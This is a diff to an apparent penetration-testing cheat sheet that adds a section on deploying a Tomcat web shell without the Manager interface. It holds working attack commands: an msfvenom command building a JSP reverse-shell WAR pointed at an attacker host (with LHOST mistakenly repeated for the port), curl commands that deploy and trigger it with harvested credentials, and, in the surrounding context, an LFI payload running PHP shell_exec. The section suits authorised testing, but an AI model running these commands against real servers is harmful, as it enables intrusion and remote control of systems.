@@ -44,6 +44,7 @@ Table of Contents
       * [Check for broken links to hijack](#check-for-broken-links-to-hijack)
       * [Bypassing file upload WAF](#bypassing-file-upload-waf)
       * [LFI Automation](#lfi-automation)
+      * [Tomcat WebShell Upload When we have no access to the Manager interface](#tomcat-webshell-upload-when-we-have-no-access-to-the-manager-interface)
    * [AWS hacking](#aws-hacking)
       * [Obtaining information about EC2](#obtaining-information-about-ec2)
       * [Obtaining a list of S3 buckets](#obtaining-a-list-of-s3-buckets)
@@ -437,6 +438,15 @@ kadimus -u [URL] -C '[PHP_CODE]'
 # Example: ./kadimus -u 'http://blabla.php?page=php://input' -C '<?php echo shell_exec("whoami");?>' -T input
 ```
 
+# Tomcat WebShell Upload When we have no access to the Manager interface
+If we are in front a Tomcat server and we have retrieved tomcat's user credentials, we can try to get access to */manager/html*.
+If, for any reason (maybe lack of privileges) we cannot access to that interface but we have privileges enough to upload .WAR files, we can do the following:
+
+```bash
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=[LHOST] LHOST=[LPORT] -f war > shell.war
+curl -u $USER:$PASSWORD -T shell.war 'http://[RHOST]:[RPORT]/manager/text/deploy?path=/rev_shell'
+curl -u $USER:$PASSWORD http://[RHOST]:[RPORT]/rev_shell/
+``` 
 
 # AWS hacking
 If, during a penetration test, we are lucky and we obtain any AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY and/or AWS_SESSION_TOKEN, we can start interrogating the AWS environment of the Enterprise audited.
